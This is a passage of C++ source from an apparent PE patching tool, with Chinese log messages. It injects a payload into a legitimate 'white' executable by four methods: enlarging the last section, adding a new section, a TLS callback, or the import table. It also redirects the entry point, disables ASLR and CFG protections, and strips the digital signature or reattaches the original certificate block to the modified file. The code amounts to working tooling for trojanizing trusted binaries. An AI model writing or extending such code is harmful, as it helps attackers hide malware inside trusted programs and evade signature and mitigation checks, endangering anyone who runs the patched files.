                m2.SetEntryPoint(newOepRva);
            }
            DisableAslrAndCfg(m2, true);
            if (removeSignature) {
                IMAGE_DATA_DIRECTORY* secDir = m2.DataDir(IMAGE_DIRECTORY_ENTRY_SECURITY);
                if (secDir) {
                    secDir->VirtualAddress = 0;
                    secDir->Size = 0;
                }
            }
        }

        Log(CUI::LogLevel::Success, "Patch", std::format("数据注入成功，共写入 {} 字节", payloadData.size()));
    } else {
        // 附加式模式: 先摘除签名 Overlay
        std::vector<uint8_t> certBlock;
        DetachSecurityDirectory(whiteBuffer, certBlock);

        bool ok = false;
        switch (mode) {
        case PatchMode::EnlargeLastSection:
            Log(CUI::LogLevel::Info, "Patch", "模式: 扩容末尾节注入");
            ok = InjectByEnlargeLastSection(whiteBuffer, payloadData);
            break;
        case PatchMode::AddNewSection:
            Log(CUI::LogLevel::Info, "Patch", "模式: 新增独立节注入");
            ok = InjectByNewSection(whiteBuffer, payloadData);
            break;
        case PatchMode::TlsCallback:
            Log(CUI::LogLevel::Info, "Patch", "模式: TLS 回调注入");
            ok = InjectByTlsCallback(whiteBuffer, payloadData);
            break;
        case PatchMode::ImportInjection:
            Log(CUI::LogLevel::Info, "Patch", "模式: 导入表注入");
            ok = InjectByImportTable(whiteBuffer, payloadPath);
            break;
        default:
            Log(CUI::LogLevel::Error, "Patch", "未知的 Patch 模式");
            break;
        }
        if (!ok) {
            Log(CUI::LogLevel::Error, "Patch", "注入失败，已中止写出");
            return false;
        }

        if (!removeSignature && !certBlock.empty()) {
            AttachSecurityDirectory(whiteBuffer, certBlock);
        } else {
            // 用户选择剥离签名或白文件本来无签名
            PeMap m3;
            if (MapPeBuffer(whiteBuffer, m3)) {
                IMAGE_DATA_DIRECTORY* secDir = m3.DataDir(IMAGE_DIRECTORY_ENTRY_SECURITY);
                if (secDir) {
                    secDir->VirtualAddress = 0;
                    secDir->Size = 0;
                }
            }
            if (removeSignature && !certBlock.empty()) {
                Log(CUI::LogLevel::Success, "Signature", "已在 Patch 流程中剥离数字签名");
            }
        }
    }

    // 4. 写出到目标文件
    if (!WriteBinaryFile(outputPath, whiteBuffer)) {
        Log(CUI::LogLevel::Error, "Patch", "输出修补后文件失败: " + WstrToUtf8(outputPath));
        return false;
    }

    Log(CUI::LogLevel::Success, "Patch", "文件已成功生成: " + WstrToUtf8(outputPath));
    return true;
}

} // namespace Patcher::Core
